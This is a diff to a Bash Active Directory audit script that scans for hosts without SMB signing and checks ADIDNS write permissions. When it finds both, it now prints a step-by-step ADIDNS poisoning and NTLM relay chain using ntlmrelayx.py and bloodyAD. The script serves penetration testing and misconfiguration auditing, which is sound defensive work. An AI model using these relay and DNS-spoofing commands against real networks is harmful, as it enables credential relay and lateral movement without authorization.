@@ -235,6 +235,33 @@ else
   DC_COUNT=0
 fi
 
+# Scan scope for relay targets
+SUBNET=$(echo "$DC_IP" | cut -d'.' -f1-3)
+> "$OUTPUT_DIR/relay_targets_raw.txt"
+for target in "${SCAN_TARGETS[@]}"; do
+  nxc smb "$target" -u "$AD_USER" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_raw_tmp.txt" &>/dev/null
+  [ -f "$OUTPUT_DIR/relay_raw_tmp.txt" ] && cat "$OUTPUT_DIR/relay_raw_tmp.txt" >> "$OUTPUT_DIR/relay_targets_raw.txt"
+  rm -f "$OUTPUT_DIR/relay_raw_tmp.txt"
+done
+
+# Filter out DC IPs from relay targets using all_dcs.txt
+DC_IPS=$(awk -F: '{print $2}' "$OUTPUT_DIR/all_dcs.txt" 2>/dev/null)
+if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
+  > "$OUTPUT_DIR/relay_targets.txt"
+  while IFS= read -r ip; do
+    if ! echo "$DC_IPS" | grep -q "^$ip$"; then
+      echo "$ip" >> "$OUTPUT_DIR/relay_targets.txt"
+    fi
+  done < "$OUTPUT_DIR/relay_targets_raw.txt"
+  rm "$OUTPUT_DIR/relay_targets_raw.txt"
+fi
+RELAY_COUNT=$([ -f "$OUTPUT_DIR/relay_targets.txt" ] && wc -l < "$OUTPUT_DIR/relay_targets.txt" || echo 0)
+if [ "$RELAY_COUNT" -gt 0 ]; then
+  echo -e "${GREY}[*] Found $RELAY_COUNT non-DC relay target(s) without SMB Signing → relay_targets.txt${NC}"
+else
+  echo -e "${GREY}[*] No non-DC relay targets without SMB Signing found${NC}"
+fi
+
 echo ""
 
 # CA on DC check
@@ -586,9 +613,16 @@ ADIDNS_CREATECHILD=$(echo "$ADIDNS_OUTPUT" | awk '
 if [ ! -z "$ADIDNS_CREATECHILD" ]; then
   ADIDNS_TRUSTEES=$(echo "$ADIDNS_CREATECHILD" | tr '\n' ',' | sed 's/,$//')
   echo -e "${RED}[KO] No ADIDNS restriction for $ADIDNS_TRUSTEES (ADIDNS Poisoning)${NC}"
-  echo -e "${GREY}       └─ bloodyAD -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --host $DC_IP add dnsRecord <hostname> <YOUR_IP>${NC}"
+  if [ "$RELAY_COUNT" -gt 0 ]; then
+    echo -e "${RED}       └─ ADIDNS Poisoning + NTLM Relay possible${NC}"
+    echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
+    echo -e "${GREY}          2) bloodyAD -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --host $DC_IP add dnsRecord <existing-fileserver01> <YOUR_IP>${NC}"
+    echo -e "${GREY}          3) Wait for auth to \\\\fileserver01\\share → relay zu non-DC Target${NC}"
+  else
+    echo -e "${GREY}       └─ bloodyAD -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --host $DC_IP add dnsRecord <hostname> <YOUR_IP>${NC}"
+  fi
 else
-  echo -e "${GREEN}[OK] ADIDNS zone write access is restricted (no ADIDNS Poisoning)${NC}"
+  echo -e "${GREEN}[OK] ADIDNS zone write access is restricted${NC}"
 fi
 
 # WebDAV detection
@@ -627,35 +661,6 @@ if [ "$SMBV1_COUNT" -gt 0 ]; then
 else
   echo -e "${GREEN}[OK] SMBv1 disabled on scanned hosts${NC}"
 fi
-
-# Scan scope for relay targets (exclude DCs)
-SUBNET=$(echo "$DC_IP" | cut -d'.' -f1-3)
-> "$OUTPUT_DIR/relay_targets_raw.txt"
-for target in "${SCAN_TARGETS[@]}"; do
-  nxc smb "$target" -u "$AD_USER" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_raw_tmp.txt" &>/dev/null
-  [ -f "$OUTPUT_DIR/relay_raw_tmp.txt" ] && cat "$OUTPUT_DIR/relay_raw_tmp.txt" >> "$OUTPUT_DIR/relay_targets_raw.txt"
-  rm -f "$OUTPUT_DIR/relay_raw_tmp.txt"
-done
-
-# Get all DC IPs from AD
-DC_IPS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
-  -b "$DOMAIN_DN" \
-  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" dNSHostName 2>/dev/null | \
-  grep "^dNSHostName:" | awk '{print $2}' | while read fqdn; do
-    dig +short "$fqdn" 2>/dev/null | grep -E '^[0-9]+\.'
-  done | sort -u)
-
-# Filter out DC IPs from relay targets
-if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
-  > "$OUTPUT_DIR/relay_targets.txt"  # Clear file
-  while IFS= read -r ip; do
-    if ! echo "$DC_IPS" | grep -q "^$ip$"; then
-      echo "$ip" >> "$OUTPUT_DIR/relay_targets.txt"
-    fi
-  done < "$OUTPUT_DIR/relay_targets_raw.txt"
-  rm "$OUTPUT_DIR/relay_targets_raw.txt"
-fi
-RELAY_COUNT=$([ -f "$OUTPUT_DIR/relay_targets.txt" ] && wc -l < "$OUTPUT_DIR/relay_targets.txt" || echo 0)
 
 # NTLMv2 - SMB Signing on DCs
 if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
